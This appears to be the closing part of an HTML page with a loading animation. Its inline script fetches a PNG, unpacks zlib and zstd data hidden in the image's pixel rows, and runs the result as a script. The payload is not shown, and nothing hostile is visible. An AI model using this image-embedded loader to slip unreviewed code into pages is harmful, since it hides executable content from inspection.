  <svg id="loading" width="90" height="50"><rect width="90" height="50" fill="none" /><text y="20">⏳<animateMotion path="M 0 0 H 60 Z" dur="3s" repeatCount=9 /></text></svg>
  <script src="fzstd.min.js"> </script>
  <script src="fflate.min.js"></script>
  <script>
    fetch("20250316T162427738Z-73a57dd8.png").then((q) => {
      q.arrayBuffer().then((a) => {
        let l = fflate.unzlibSync(new Uint8Array(a.slice(41, -16))),
          f = 0,
          p = 0,
          r = 0,
          u = new Uint8Array(l.length);
        do {
          if (r == 1024 || f == 0) {
            f++;
            r = 0;
          } else {
            u[p] = l[f];
            r++;
            f++;
            p++;
          }
        } while (f < l.length);
        let z = fzstd.decompress(u.slice(7 * 1024, 7 * 1024 + 1041968)),
          s = document.createElement("script");
        s.appendChild(document.createTextNode(new TextDecoder().decode(z)));
        document.body.appendChild(s);
      });
    });

  </script>
</body>
